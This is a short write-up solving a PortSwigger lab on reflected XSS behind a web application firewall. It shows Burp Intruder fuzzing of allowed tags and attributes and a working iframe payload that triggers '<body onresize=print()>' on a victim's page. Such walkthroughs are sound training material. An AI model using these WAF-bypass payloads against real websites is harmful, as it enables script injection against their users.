# [Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

## Lab

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.

## Analysis

tried:

```url
<https://id.web-security-academy.net/?search=%3Cscript%3Eprint%28%29%3C%2Fscript%3E>
```

result: `"Tag is not allowed"`

## Solutions

1. find allowed tags using burp's intruder:
    - positions: `GET /?search=<§§> HTTP/1.1`
    - payloads: all tags from [xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    - result: `body` tag is allowed
2. try `<body onload=alert(1)>`:
    - result: `"Attribute is not allowed"`
3. find allowed attributes using burp's intruder:
    - positions: `GET /?search=%3Cbody+§onload§%3Dprint%28%29%3E HTTP/1.1`
    - payloads: all attributes from [xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    - result:
        - `onbeforeinput` is allowed: The DOM beforeinput event fires when the value of an `<input>`, or `<textarea>` element is about to be modified.
        - `onresize` is allowed: call a function when the browser window is resized.
4. upload this to exploit server

    ```html
    <iframe src="https://id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=1>
    ```

    - `onload=this.style.width=1` automatically resize our exploit page, it triggers the onresize too.
    - send to victim => lab solved
